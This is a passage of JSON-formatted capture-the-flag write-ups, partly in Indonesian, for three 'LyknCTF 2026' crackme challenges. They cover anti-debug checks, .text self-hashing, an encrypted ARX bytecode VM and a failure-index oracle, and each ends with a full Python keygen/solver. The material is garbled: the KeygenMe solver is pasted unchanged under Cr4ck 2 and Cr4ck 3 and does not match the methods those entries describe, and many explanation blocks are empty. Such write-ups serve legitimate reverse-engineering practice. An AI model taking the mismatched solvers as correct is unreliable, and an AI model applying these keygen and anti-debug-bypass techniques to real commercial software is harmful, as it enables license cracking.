        "code": "python3 solve.py KeygenMe.exe"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "[+] Username : th3_LYKN_v3nd0r\n[+] License  : 7211-57C4-CD96-CC26-5B67\n[+] Flag     : LYKNCTF{k3yg3n_h3ll_s3lfh4sh_4ntidbg_h1dd3n_us3r_2026}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport hashlib\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nMASK32 = 0xFFFFFFFF\r\nRC4_KEY = b\"L0i_Y3u_Kh0_N0i\"\r\nUSERNAME_MASK = bytes.fromhex(\"add993f24ca678dc1d369f61e40236\")\r\nCIPHERTEXT_RVA = 0x6280\r\nCIPHERTEXT_SIZE = 0x60\r\nEXPECTED_CHECK_PREFIX = bytes.fromhex(\"7db51c69a8dd7926\")\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    value &= MASK32\r\n    return ((value << count) | (value >> (32 - count))) & MASK32\r\n\r\n\r\ndef rc4_ksa(key: bytes) -> list[int]:\r\n    state = list(range(256))\r\n    j = 0\r\n    for i in range(256):\r\n        j = (j + state[i] + key[i % len(key)]) & 0xFF\r\n        state[i], state[j] = state[j], state[i]\r\n    return state\r\n\r\n\r\ndef recover_username(state: list[int]) -> bytes:\r\n    selected = (0x42, 0x3D, 0x38, 0x33, 0x2E, 0x29, 0x24, 0x1F)\r\n    packed = 0\r\n    for index in selected:\r\n        packed = (packed << 8) | state[index]\r\n\r\n    username = bytearray(15)\r\n    packed ^= int.from_bytes(USERNAME_MASK[:8], \"little\")\r\n    username[:8] = packed.to_bytes(8, \"little\")\r\n\r\n    for position in range(8, 15):\r\n        table_index = 0x47 + 5 * (position - 8)\r\n        username[position] = USERNAME_MASK[position] ^ state[table_index]\r\n\r\n    return bytes(username)\r\n\r\n\r\ndef generate_license(username: bytes, state: list[int], anti_debug: int = 0) -> str:\r\n    r8 = ((anti_debug & 0xFF) * 0x01010101) ^ 0x4C594B4E\r\n    r9 = 0xAE054FB9\r\n    r11 = 0x43544632\r\n    accumulator = 0xA5A5F00D\r\n\r\n    for offset in (0, 7, 14):\r\n        for character in username:\r\n            table_value = state[(character + offset) & 0xFF]\r\n\r\n            mixed_r8 = rol32(r8 ^ table_value, 5)\r\n            mixed_r11 = rol32((table_value + r11) & MASK32, 11)\r\n            r8 = (mixed_r8 + r11) & MASK32\r\n\r\n            mixed_r9 = rol32(\r\n                ((table_value * 0x9E3779B1) & MASK32) ^ r9,\r\n                17,\r\n            )\r\n            r11 = mixed_r11 ^ r9\r\n            r9 = (mixed_r9 + accumulator) & MASK32\r\n\r\n            mixed_accumulator = rol32(\r\n                (state[r8 & 0xFF] + accumulator) & MASK32,\r\n                3,\r\n            )\r\n            accumulator = mixed_accumulator ^ r8\r\n\r\n    for _ in range(4):\r\n        r8 = (r8 + accumulator) & MASK32\r\n        r11 ^= rol32(r8, 7)\r\n        r9 = (r9 + r11) & MASK32\r\n        accumulator ^= rol32(r9, 13)\r\n\r\n    groups = [\r\n        (r8 >> 16) & 0xFFFF,\r\n        (r8 ^ r11) & 0xFFFF,\r\n        (r11 >> 16) & 0xFFFF,\r\n        (r9 ^ accumulator) & 0xFFFF,\r\n    ]\r\n    checksum = (\r\n        groups[0]\r\n        + groups[2]\r\n        + groups[1]\r\n        + groups[3]\r\n    ) ^ ((r9 >> 16) & 0xFFFF)\r\n    groups.append(checksum & 0xFFFF)\r\n\r\n    return \"-\".join(f\"{group:04X}\" for group in groups)\r\n\r\n\r\ndef parse_pe_sections(data: bytes) -> list[dict[str, int | str]]:\r\n    if data[:2] != b\"MZ\":\r\n        raise ValueError(\"input is not a PE file\")\r\n\r\n    pe_offset = struct.unpack_from(\"<I\", data, 0x3C)[0]\r\n    if data[pe_offset : pe_offset + 4] != b\"PE\\0\\0\":\r\n        raise ValueError(\"invalid PE signature\")\r\n\r\n    number_of_sections = struct.unpack_from(\"<H\", data, pe_offset + 6)[0]\r\n    optional_header_size = struct.unpack_from(\"<H\", data, pe_offset + 20)[0]\r\n    section_table = pe_offset + 24 + optional_header_size\r\n\r\n    sections: list[dict[str, int | str]] = []\r\n    for index in range(number_of_sections):\r\n        offset = section_table + index * 40\r\n        name = data[offset : offset + 8].split(b\"\\0\", 1)[0].decode(\"ascii\")\r\n        virtual_size, virtual_address, raw_size, raw_offset = struct.unpack_from(\r\n            \"<IIII\", data, offset + 8\r\n        )\r\n        sections.append(\r\n            {\r\n                \"name\": name,\r\n                \"virtual_size\": virtual_size,\r\n                \"virtual_address\": virtual_address,\r\n                \"raw_size\": raw_size,\r\n                \"raw_offset\": raw_offset,\r\n            }\r\n        )\r\n    return sections\r\n\r\n\r\ndef section_by_name(sections: list[dict[str, int | str]], name: str) -> dict[str, int | str]:\r\n    for section in sections:\r\n        if section[\"name\"] == name:\r\n            return section\r\n    raise ValueError(f\"section {name!r} not found\")\r\n\r\n\r\ndef rva_to_offset(sections: list[dict[str, int | str]], rva: int) -> int:\r\n    for section in sections:\r\n        start = int(section[\"virtual_address\"])\r\n        span = max(int(section[\"virtual_size\"]), int(section[\"raw_size\"]))\r\n        if start <= rva < start + span:\r\n            return int(section[\"raw_offset\"]) + (rva - start)\r\n    raise ValueError(f\"RVA 0x{rva:x} is not mapped by a section\")\r\n\r\n\r\ndef loaded_section_bytes(data: bytes, section: dict[str, int | str]) -> bytes:\r\n    virtual_size = int(section[\"virtual_size\"])\r\n    raw_size = int(section[\"raw_size\"])\r\n    raw_offset = int(section[\"raw_offset\"])\r\n    raw = data[raw_offset : raw_offset + min(raw_size, virtual_size)]\r\n    return raw.ljust(virtual_size, b\"\\0\")\r\n\r\n\r\ndef decrypt_flag(executable: bytes, username: bytes, license_key: str, anti_debug: int = 0) -> bytes:\r\n    sections = parse_pe_sections(executable)\r\n    text = loaded_section_bytes(executable, section_by_name(sections, \".text\"))\r\n    text_digest = hashlib.sha256(text).digest()\r\n\r\n    master = hashlib.sha256(\r\n        username\r\n        + b\"\\x1f\"\r\n        + license_key.encode(\"ascii\")\r\n        + b\"\\x1f\"\r\n        + text_digest\r\n        + bytes([anti_debug & 0xFF])\r\n    ).digest()\r\n\r\n    keystream = b\"\".join(\r\n        hashlib.sha256(master + struct.pack(\"<I\", counter)).digest()\r\n        for counter in range(3)\r\n    )\r\n\r\n    ciphertext_offset = rva_to_offset(sections, CIPHERTEXT_RVA)\r\n    ciphertext = executable[\r\n        ciphertext_offset : ciphertext_offset + CIPHERTEXT_SIZE\r\n    ]\r\n    plaintext = bytes(left ^ right for left, right in zip(ciphertext, keystream))\r\n    flag = plaintext.split(b\"\\0\", 1)[0]\r\n\r\n    check = hashlib.sha256(b\"LYKN2026\" + flag).digest()\r\n    if check[:8] != EXPECTED_CHECK_PREFIX:\r\n        raise ValueError(\"decryption checksum did not match\")\r\n\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    path = Path(sys.argv[1] if len(sys.argv) > 1 else \"KeygenMe.exe\")\r\n    executable = path.read_bytes()\r\n\r\n    state = rc4_ksa(RC4_KEY)\r\n    username = recover_username(state)\r\n    license_key = generate_license(username, state, anti_debug=0)\r\n    flag = decrypt_flag(executable, username, license_key, anti_debug=0)\r\n\r\n    print(f\"[+] Username : {username.decode('ascii')}\")\r\n    print(f\"[+] License  : {license_key}\")\r\n    print(f\"[+] Flag     : {flag.decode('ascii')}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{k3yg3n_h3ll_s3lfh4sh_4ntidbg_h1dd3n_us3r_2026}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-crack2",
    "title": "Cr4ck 2 — Reverse Engineering",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "- **CTF:** LYKNCTF 2026\n- **Category:** Reverse\n- **Binary:** `Activator.exe`\n- **Architecture:** PE32+ x86-64\n- **Difficulty:** Hard\n- **Flag:** `LYKNCTF{V1rtu4l_ARX_VM_LLM_h3ll_LYKN2026}`",
    "problemDescription": "Binary menerima activation key sepanjang 41 karakter dengan format:\n\n```text\nLYKNCTF{<32 byte>}\n```\n\nIsi flag tidak dibandingkan langsung. Delapan word 32-bit dari input diproses oleh bytecode VM yang dienkripsi berdasarkan hash section `.text` dan status anti-debug. VM menjalankan 32 ronde ARX, lalu membandingkan state akhir dengan delapan konstanta target.\n\nRound function-nya invertible, jadi flag bisa dipulihkan dengan mendekripsi VM lalu membalik operasi dari ronde terakhir ke ronde pertama.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Identifikasi awal:\n\n\n\nOutput penting:\n\n\n\nPemeriksaan awal di fungsi validasi:\n\n\n\nCompiler menghasilkan blok SIMD yang cukup panjang untuk memindahkan 32 byte isi key ke stack. Setelah ditelusuri, hasil semantiknya tetap identik dengan input: delapan word little-endian tanpa substitusi tambahan.",
        "code": "file Activator.exe\nstrings -a -n 5 Activator.exe | grep -Ei 'activation|LYKNCTF|debug|valid|failed'"
      },
      {
        "title": "Anti-debug dan self-hash",
        "content": "Binary membentuk satu byte anti-debug dari beberapa pemeriksaan:\n\n- `PEB.BeingDebugged`\n- `PEB.NtGlobalFlag & 0x70`\n- `NtQueryInformationProcess(ProcessDebugPort)`\n- `NtQueryInformationProcess(ProcessDebugFlags)`\n\nEksekusi normal menghasilkan mask `0x00`.\n\nSection `.text` dicari lewat PE header dan di-hash berdasarkan `VirtualSize`:\n\n\n\nDigest dasar untuk dekripsi VM:\n\n\n\nPada mask nol:\n\n\n\nBlob VM berada di RVA `0x6220` dengan panjang `0xB7` byte. Keystream dibuat per 32 byte:\n\n\n\nSetiap block di-XOR dengan ciphertext sampai seluruh 183 byte bytecode terbuka.",
        "code": "SHA256(.text) = 67fb76776acbe48ecd6380703554f09c10e586320eaeac495f9841451b88bdc3"
      },
      {
        "title": "Bytecode VM",
        "content": "Opcode yang dipakai program:\n\n| Opcode | Operasi |\n|---|---|\n| `0x22 dst, index` | Muat word input ke register VM |\n| `0x11 dst, imm32` | Muat konstanta 32-bit |\n| `0x55 dst, src` | `dst += src` |\n| `0xBB reg, n` | `reg = ROL32(reg, n)` |\n| `0x77 dst, src` | `dst ^= src` |\n| `0x99 reg, imm32` | Tambah konstanta 32-bit |\n| `0xE0 reg, rel16` | Kurangi register dan lompat jika belum nol |\n| `0x33 dst, index` | Muat word target |\n| `0xDD reg` | OR nilai mismatch ke accumulator |\n| `0xFF` | Berhenti; sukses jika accumulator nol |\n\nParameter yang diekstrak dari bytecode:\n\n\n\nDelapan konstanta target berada di RVA `0x63E8`:",
        "code": "initial key = 0x1BADC0DE\nrounds      = 32\ndelta       = 0x9E3779B9\nrotations   = [7, 9, 13, 18, 3, 11, 17, 5]"
      },
      {
        "title": "Round function",
        "content": "State terdiri dari delapan word `r[0..7]`. Setiap ronde menjalankan operasi secara berurutan:\n\n\n\nUrutan eksekusi berpengaruh. Saat `i == 7`, operasi XOR memakai `r[0]` yang sudah diperbarui pada awal ronde.",
        "code": "for i in range(8):\n    r[i] = rol32(r[i] + key, rotations[i])\n    r[i] ^= r[(i + 1) & 7]\nkey += 0x9E3779B9"
      },
      {
        "title": "Membalik ARX",
        "content": "Untuk state akhir `y`, word terakhir dipulihkan lebih dulu:\n\n\n\nWord lain dibalik dari indeks 6 sampai 0:\n\n\n\nProses ini dijalankan dari ronde 31 ke ronde 0, dengan semua operasi modulo `2^32`.\n\nHasil delapan word awal:\n\n\n\nRepresentasi byte little-endian:\n\n\n\nSolver menjalankan algoritma forward sekali lagi dan memastikan state akhirnya sama persis dengan target sebelum mencetak flag.",
        "code": "old[7] = ROR32(y[7] XOR y[0], rot[7]) - key"
      },
      {
        "title": "Solver",
        "content": "Solver hanya memakai Python standard library. Ia mem-parsing PE, menghitung self-hash, mendekripsi bytecode, mengambil parameter ARX, membalik 32 ronde, dan memverifikasi hasil.",
        "code": "python3 solve.py Activator.exe"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "[+] SHA256(.text): 67fb76776acbe48ecd6380703554f09c10e586320eaeac495f9841451b88bdc3\n[+] VM program   : 183 bytes\n[+] ARX rounds   : 32\n[+] Rotations    : [7, 9, 13, 18, 3, 11, 17, 5]\n[+] Flag         : LYKNCTF{V1rtu4l_ARX_VM_LLM_h3ll_LYKN2026}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport hashlib\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nMASK32 = 0xFFFFFFFF\r\nRC4_KEY = b\"L0i_Y3u_Kh0_N0i\"\r\nUSERNAME_MASK = bytes.fromhex(\"add993f24ca678dc1d369f61e40236\")\r\nCIPHERTEXT_RVA = 0x6280\r\nCIPHERTEXT_SIZE = 0x60\r\nEXPECTED_CHECK_PREFIX = bytes.fromhex(\"7db51c69a8dd7926\")\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    value &= MASK32\r\n    return ((value << count) | (value >> (32 - count))) & MASK32\r\n\r\n\r\ndef rc4_ksa(key: bytes) -> list[int]:\r\n    state = list(range(256))\r\n    j = 0\r\n    for i in range(256):\r\n        j = (j + state[i] + key[i % len(key)]) & 0xFF\r\n        state[i], state[j] = state[j], state[i]\r\n    return state\r\n\r\n\r\ndef recover_username(state: list[int]) -> bytes:\r\n    selected = (0x42, 0x3D, 0x38, 0x33, 0x2E, 0x29, 0x24, 0x1F)\r\n    packed = 0\r\n    for index in selected:\r\n        packed = (packed << 8) | state[index]\r\n\r\n    username = bytearray(15)\r\n    packed ^= int.from_bytes(USERNAME_MASK[:8], \"little\")\r\n    username[:8] = packed.to_bytes(8, \"little\")\r\n\r\n    for position in range(8, 15):\r\n        table_index = 0x47 + 5 * (position - 8)\r\n        username[position] = USERNAME_MASK[position] ^ state[table_index]\r\n\r\n    return bytes(username)\r\n\r\n\r\ndef generate_license(username: bytes, state: list[int], anti_debug: int = 0) -> str:\r\n    r8 = ((anti_debug & 0xFF) * 0x01010101) ^ 0x4C594B4E\r\n    r9 = 0xAE054FB9\r\n    r11 = 0x43544632\r\n    accumulator = 0xA5A5F00D\r\n\r\n    for offset in (0, 7, 14):\r\n        for character in username:\r\n            table_value = state[(character + offset) & 0xFF]\r\n\r\n            mixed_r8 = rol32(r8 ^ table_value, 5)\r\n            mixed_r11 = rol32((table_value + r11) & MASK32, 11)\r\n            r8 = (mixed_r8 + r11) & MASK32\r\n\r\n            mixed_r9 = rol32(\r\n                ((table_value * 0x9E3779B1) & MASK32) ^ r9,\r\n                17,\r\n            )\r\n            r11 = mixed_r11 ^ r9\r\n            r9 = (mixed_r9 + accumulator) & MASK32\r\n\r\n            mixed_accumulator = rol32(\r\n                (state[r8 & 0xFF] + accumulator) & MASK32,\r\n                3,\r\n            )\r\n            accumulator = mixed_accumulator ^ r8\r\n\r\n    for _ in range(4):\r\n        r8 = (r8 + accumulator) & MASK32\r\n        r11 ^= rol32(r8, 7)\r\n        r9 = (r9 + r11) & MASK32\r\n        accumulator ^= rol32(r9, 13)\r\n\r\n    groups = [\r\n        (r8 >> 16) & 0xFFFF,\r\n        (r8 ^ r11) & 0xFFFF,\r\n        (r11 >> 16) & 0xFFFF,\r\n        (r9 ^ accumulator) & 0xFFFF,\r\n    ]\r\n    checksum = (\r\n        groups[0]\r\n        + groups[2]\r\n        + groups[1]\r\n        + groups[3]\r\n    ) ^ ((r9 >> 16) & 0xFFFF)\r\n    groups.append(checksum & 0xFFFF)\r\n\r\n    return \"-\".join(f\"{group:04X}\" for group in groups)\r\n\r\n\r\ndef parse_pe_sections(data: bytes) -> list[dict[str, int | str]]:\r\n    if data[:2] != b\"MZ\":\r\n        raise ValueError(\"input is not a PE file\")\r\n\r\n    pe_offset = struct.unpack_from(\"<I\", data, 0x3C)[0]\r\n    if data[pe_offset : pe_offset + 4] != b\"PE\\0\\0\":\r\n        raise ValueError(\"invalid PE signature\")\r\n\r\n    number_of_sections = struct.unpack_from(\"<H\", data, pe_offset + 6)[0]\r\n    optional_header_size = struct.unpack_from(\"<H\", data, pe_offset + 20)[0]\r\n    section_table = pe_offset + 24 + optional_header_size\r\n\r\n    sections: list[dict[str, int | str]] = []\r\n    for index in range(number_of_sections):\r\n        offset = section_table + index * 40\r\n        name = data[offset : offset + 8].split(b\"\\0\", 1)[0].decode(\"ascii\")\r\n        virtual_size, virtual_address, raw_size, raw_offset = struct.unpack_from(\r\n            \"<IIII\", data, offset + 8\r\n        )\r\n        sections.append(\r\n            {\r\n                \"name\": name,\r\n                \"virtual_size\": virtual_size,\r\n                \"virtual_address\": virtual_address,\r\n                \"raw_size\": raw_size,\r\n                \"raw_offset\": raw_offset,\r\n            }\r\n        )\r\n    return sections\r\n\r\n\r\ndef section_by_name(sections: list[dict[str, int | str]], name: str) -> dict[str, int | str]:\r\n    for section in sections:\r\n        if section[\"name\"] == name:\r\n            return section\r\n    raise ValueError(f\"section {name!r} not found\")\r\n\r\n\r\ndef rva_to_offset(sections: list[dict[str, int | str]], rva: int) -> int:\r\n    for section in sections:\r\n        start = int(section[\"virtual_address\"])\r\n        span = max(int(section[\"virtual_size\"]), int(section[\"raw_size\"]))\r\n        if start <= rva < start + span:\r\n            return int(section[\"raw_offset\"]) + (rva - start)\r\n    raise ValueError(f\"RVA 0x{rva:x} is not mapped by a section\")\r\n\r\n\r\ndef loaded_section_bytes(data: bytes, section: dict[str, int | str]) -> bytes:\r\n    virtual_size = int(section[\"virtual_size\"])\r\n    raw_size = int(section[\"raw_size\"])\r\n    raw_offset = int(section[\"raw_offset\"])\r\n    raw = data[raw_offset : raw_offset + min(raw_size, virtual_size)]\r\n    return raw.ljust(virtual_size, b\"\\0\")\r\n\r\n\r\ndef decrypt_flag(executable: bytes, username: bytes, license_key: str, anti_debug: int = 0) -> bytes:\r\n    sections = parse_pe_sections(executable)\r\n    text = loaded_section_bytes(executable, section_by_name(sections, \".text\"))\r\n    text_digest = hashlib.sha256(text).digest()\r\n\r\n    master = hashlib.sha256(\r\n        username\r\n        + b\"\\x1f\"\r\n        + license_key.encode(\"ascii\")\r\n        + b\"\\x1f\"\r\n        + text_digest\r\n        + bytes([anti_debug & 0xFF])\r\n    ).digest()\r\n\r\n    keystream = b\"\".join(\r\n        hashlib.sha256(master + struct.pack(\"<I\", counter)).digest()\r\n        for counter in range(3)\r\n    )\r\n\r\n    ciphertext_offset = rva_to_offset(sections, CIPHERTEXT_RVA)\r\n    ciphertext = executable[\r\n        ciphertext_offset : ciphertext_offset + CIPHERTEXT_SIZE\r\n    ]\r\n    plaintext = bytes(left ^ right for left, right in zip(ciphertext, keystream))\r\n    flag = plaintext.split(b\"\\0\", 1)[0]\r\n\r\n    check = hashlib.sha256(b\"LYKN2026\" + flag).digest()\r\n    if check[:8] != EXPECTED_CHECK_PREFIX:\r\n        raise ValueError(\"decryption checksum did not match\")\r\n\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    path = Path(sys.argv[1] if len(sys.argv) > 1 else \"KeygenMe.exe\")\r\n    executable = path.read_bytes()\r\n\r\n    state = rc4_ksa(RC4_KEY)\r\n    username = recover_username(state)\r\n    license_key = generate_license(username, state, anti_debug=0)\r\n    flag = decrypt_flag(executable, username, license_key, anti_debug=0)\r\n\r\n    print(f\"[+] Username : {username.decode('ascii')}\")\r\n    print(f\"[+] License  : {license_key}\")\r\n    print(f\"[+] Flag     : {flag.decode('ascii')}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{V1rtu4l_ARX_VM_LLM_h3ll_LYKN2026}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-crack3",
    "title": "Cr4ck 3 — Reverse Engineering",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKN CTF 2026  \n**Category:** Reverse  \n**Challenge:** Cr4ck 3  \n**Flag:** `LYKNCTF{Dyn4m1c_0nly_LYKN_2026!!}`",
    "problemDescription": "`Serial.exe` menerima serial sepanjang 33 byte dengan format:\n\n```text\nLYKNCTF{<24 karakter>}\n```\n\nIsi 24 karakter tidak dibandingkan dengan string statis. Program menghitung SHA-256 section `.text`, memakai hasilnya untuk membentuk seed, lalu menjalankan bytecode VM yang terenkripsi. Setiap karakter menghasilkan nilai 16-bit yang dibandingkan dengan tabel target. Jalur gagal menyimpan indeks karakter yang salah, sehingga indeks itu bisa dipakai sebagai oracle untuk memulihkan serial satu byte per percobaan.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Hasil penting:\n\n\n\nBinary berupa PE64 native hasil kompilasi MinGW, bukan .NET. Pemeriksaan awal di `0x140001d38` memastikan:\n\n- panjang input tepat `0x21` atau 33 byte;\n- delapan byte pertama adalah `LYKNCTF{`;\n- byte terakhir adalah `}`.\n\nPayload yang diperiksa VM berada pada indeks 8 sampai 31, total 24 byte.",
        "code": "file Serial.exe\nstrings -a -n 4 Serial.exe\nobjdump -p Serial.exe"
      },
      {
        "title": "Seed dari section `.text`",
        "content": "Verifier mencari section bernama `.text` melalui PE header, lalu menghitung SHA-256 atas seluruh virtual size section tersebut. Digest binary yang dianalisis:\n\n\n\nTLS callback mengisi global seed di RVA `0x9048` dengan:\n\n\n\nPada RVA `0x1f11`, dword pertama digest diambil dalam urutan little-endian dan di-XOR dengan seed TLS. Nilai itu menjadi state awal untuk dekripsi instruction stream VM.",
        "code": "1fdc57d0b9ee231496585ec9160394a6ca5c8d3de2f715cc8626127ebb53189f"
      },
      {
        "title": "Struktur VM",
        "content": "Bagian utama verifier berada pada RVA `0x1f11` sampai sekitar `0x27e3`.\n\nData penting:\n\n| RVA | Fungsi |\n|---:|---|\n| `0x60f4` | jump table opcode |\n| `0x6180` | bytecode VM terenkripsi |\n| `0x61c0` | 24 target word, satu per karakter |\n| `0x9048` | seed dari TLS callback |\n| `0x5008` | indeks karakter yang gagal |\n\nUntuk setiap posisi, VM:\n\n1. Mengosongkan delapan register virtual 32-bit.\n2. Memasukkan karakter saat ini dan state seed ke register virtual.\n3. Mendekripsi opcode dan operand memakai byte paling atas dari PRNG state.\n4. Menjalankan operasi integer seperti XOR, OR, shift, rotate, multiply, move, dan load immediate.\n5. Menghasilkan nilai pada register host `r8d`.\n6. Membandingkan `r8w` dengan target `target[position]`.\n\nJika hasil salah, cabang pada RVA `0x27b5` menyimpan nomor posisi ke global `0x5008` lalu menampilkan dialog gagal. Jika benar, seed diperbarui dan program lanjut ke posisi berikutnya.\n\nUpdate seed antarkarakter terlihat sebagai:",
        "code": "seed = rol32(seed * 0x9c5ab3d7 + 0x3f1e5c2b, 13)"
      },
      {
        "title": "Memakai failure index sebagai oracle",
        "content": "VM memeriksa karakter secara berurutan. Misalnya prefix yang sudah benar berjumlah lima byte:\n\n\n\nSetiap kandidat untuk posisi keenam diuji dengan filler `A` pada sisa payload. Kandidat salah berhenti dengan indeks gagal `5`. Kandidat benar berhasil melewati posisi itu dan berhenti pada indeks yang lebih besar.\n\nPseudocode recovery:\n\n\n\nTidak perlu memecahkan semua opcode VM secara simbolik. Verifier asli dijalankan lewat Unicorn mulai RVA `0x1f11`. Stack frame, digest `.text`, input, dan TLS seed disiapkan manual. Emulasi dihentikan sebelum `MessageBoxA` pada jalur sukses atau gagal.",
        "code": "Dyn4m"
      },
      {
        "title": "Dependency:",
        "content": "",
        "code": "python3 -m pip install pefile unicorn"
      },
      {
        "title": "Jalankan:",
        "content": "Output akhir:",
        "code": "python3 solve.py Serial.exe"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport hashlib\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nMASK32 = 0xFFFFFFFF\r\nRC4_KEY = b\"L0i_Y3u_Kh0_N0i\"\r\nUSERNAME_MASK = bytes.fromhex(\"add993f24ca678dc1d369f61e40236\")\r\nCIPHERTEXT_RVA = 0x6280\r\nCIPHERTEXT_SIZE = 0x60\r\nEXPECTED_CHECK_PREFIX = bytes.fromhex(\"7db51c69a8dd7926\")\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    value &= MASK32\r\n    return ((value << count) | (value >> (32 - count))) & MASK32\r\n\r\n\r\ndef rc4_ksa(key: bytes) -> list[int]:\r\n    state = list(range(256))\r\n    j = 0\r\n    for i in range(256):\r\n        j = (j + state[i] + key[i % len(key)]) & 0xFF\r\n        state[i], state[j] = state[j], state[i]\r\n    return state\r\n\r\n\r\ndef recover_username(state: list[int]) -> bytes:\r\n    selected = (0x42, 0x3D, 0x38, 0x33, 0x2E, 0x29, 0x24, 0x1F)\r\n    packed = 0\r\n    for index in selected:\r\n        packed = (packed << 8) | state[index]\r\n\r\n    username = bytearray(15)\r\n    packed ^= int.from_bytes(USERNAME_MASK[:8], \"little\")\r\n    username[:8] = packed.to_bytes(8, \"little\")\r\n\r\n    for position in range(8, 15):\r\n        table_index = 0x47 + 5 * (position - 8)\r\n        username[position] = USERNAME_MASK[position] ^ state[table_index]\r\n\r\n    return bytes(username)\r\n\r\n\r\ndef generate_license(username: bytes, state: list[int], anti_debug: int = 0) -> str:\r\n    r8 = ((anti_debug & 0xFF) * 0x01010101) ^ 0x4C594B4E\r\n    r9 = 0xAE054FB9\r\n    r11 = 0x43544632\r\n    accumulator = 0xA5A5F00D\r\n\r\n    for offset in (0, 7, 14):\r\n        for character in username:\r\n            table_value = state[(character + offset) & 0xFF]\r\n\r\n            mixed_r8 = rol32(r8 ^ table_value, 5)\r\n            mixed_r11 = rol32((table_value + r11) & MASK32, 11)\r\n            r8 = (mixed_r8 + r11) & MASK32\r\n\r\n            mixed_r9 = rol32(\r\n                ((table_value * 0x9E3779B1) & MASK32) ^ r9,\r\n                17,\r\n            )\r\n            r11 = mixed_r11 ^ r9\r\n            r9 = (mixed_r9 + accumulator) & MASK32\r\n\r\n            mixed_accumulator = rol32(\r\n                (state[r8 & 0xFF] + accumulator) & MASK32,\r\n                3,\r\n            )\r\n            accumulator = mixed_accumulator ^ r8\r\n\r\n    for _ in range(4):\r\n        r8 = (r8 + accumulator) & MASK32\r\n        r11 ^= rol32(r8, 7)\r\n        r9 = (r9 + r11) & MASK32\r\n        accumulator ^= rol32(r9, 13)\r\n\r\n    groups = [\r\n        (r8 >> 16) & 0xFFFF,\r\n        (r8 ^ r11) & 0xFFFF,\r\n        (r11 >> 16) & 0xFFFF,\r\n        (r9 ^ accumulator) & 0xFFFF,\r\n    ]\r\n    checksum = (\r\n        groups[0]\r\n        + groups[2]\r\n        + groups[1]\r\n        + groups[3]\r\n    ) ^ ((r9 >> 16) & 0xFFFF)\r\n    groups.append(checksum & 0xFFFF)\r\n\r\n    return \"-\".join(f\"{group:04X}\" for group in groups)\r\n\r\n\r\ndef parse_pe_sections(data: bytes) -> list[dict[str, int | str]]:\r\n    if data[:2] != b\"MZ\":\r\n        raise ValueError(\"input is not a PE file\")\r\n\r\n    pe_offset = struct.unpack_from(\"<I\", data, 0x3C)[0]\r\n    if data[pe_offset : pe_offset + 4] != b\"PE\\0\\0\":\r\n        raise ValueError(\"invalid PE signature\")\r\n\r\n    number_of_sections = struct.unpack_from(\"<H\", data, pe_offset + 6)[0]\r\n    optional_header_size = struct.unpack_from(\"<H\", data, pe_offset + 20)[0]\r\n    section_table = pe_offset + 24 + optional_header_size\r\n\r\n    sections: list[dict[str, int | str]] = []\r\n    for index in range(number_of_sections):\r\n        offset = section_table + index * 40\r\n        name = data[offset : offset + 8].split(b\"\\0\", 1)[0].decode(\"ascii\")\r\n        virtual_size, virtual_address, raw_size, raw_offset = struct.unpack_from(\r\n            \"<IIII\", data, offset + 8\r\n        )\r\n        sections.append(\r\n            {\r\n                \"name\": name,\r\n                \"virtual_size\": virtual_size,\r\n                \"virtual_address\": virtual_address,\r\n                \"raw_size\": raw_size,\r\n                \"raw_offset\": raw_offset,\r\n            }\r\n        )\r\n    return sections\r\n\r\n\r\ndef section_by_name(sections: list[dict[str, int | str]], name: str) -> dict[str, int | str]:\r\n    for section in sections:\r\n        if section[\"name\"] == name:\r\n            return section\r\n    raise ValueError(f\"section {name!r} not found\")\r\n\r\n\r\ndef rva_to_offset(sections: list[dict[str, int | str]], rva: int) -> int:\r\n    for section in sections:\r\n        start = int(section[\"virtual_address\"])\r\n        span = max(int(section[\"virtual_size\"]), int(section[\"raw_size\"]))\r\n        if start <= rva < start + span:\r\n            return int(section[\"raw_offset\"]) + (rva - start)\r\n    raise ValueError(f\"RVA 0x{rva:x} is not mapped by a section\")\r\n\r\n\r\ndef loaded_section_bytes(data: bytes, section: dict[str, int | str]) -> bytes:\r\n    virtual_size = int(section[\"virtual_size\"])\r\n    raw_size = int(section[\"raw_size\"])\r\n    raw_offset = int(section[\"raw_offset\"])\r\n    raw = data[raw_offset : raw_offset + min(raw_size, virtual_size)]\r\n    return raw.ljust(virtual_size, b\"\\0\")\r\n\r\n\r\ndef decrypt_flag(executable: bytes, username: bytes, license_key: str, anti_debug: int = 0) -> bytes:\r\n    sections = parse_pe_sections(executable)\r\n    text = loaded_section_bytes(executable, 